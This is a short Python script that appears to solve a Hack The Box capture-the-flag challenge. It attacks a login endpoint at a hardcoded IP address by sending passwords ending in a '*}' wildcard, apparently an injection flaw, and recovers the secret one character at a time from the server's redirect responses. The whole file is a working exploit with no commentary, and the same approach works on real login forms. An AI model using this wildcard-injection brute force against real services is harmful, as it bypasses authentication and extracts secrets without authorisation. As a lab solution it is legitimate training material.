import requests
import string

headers = {"UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"}

url = "http://68.183.45.43:31458/login"

chars = string.ascii_letters
chars+= ''.join(['0','1','2','3','4','5','6','7','8','9','`','~','!','@','#','$','%','&','-','_',"'"])

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars):
        print(flag+ "}")
        break

    password = flag + chars[counter] + "*}"
    print("Trying: " + password)


    data = {"username":"Reese","password":password}
    response = requests.post(url=url, headers=headers, data=data)

    if (response.url!= url + "?message=Authentication%20failed"):
        flag += chars[counter]
        counter=0
    else:
        counter += 1

